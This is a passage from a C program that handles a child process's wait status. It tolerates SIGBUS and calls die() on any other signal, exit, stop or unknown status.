                case SIGBUS:
                    break;
                default:
                    die();
            }
        } else if (WIFEXITED(status)) {
            printf("exited %d\n", WEXITSTATUS(status));
            die();
        } else if (WIFSTOPPED(status)) {
            printf("stopped %d\n", WSTOPSIG(status));
            die();
        } else {
            printf("unknown %d\n", status);
            die();
        }
    }
    die();
}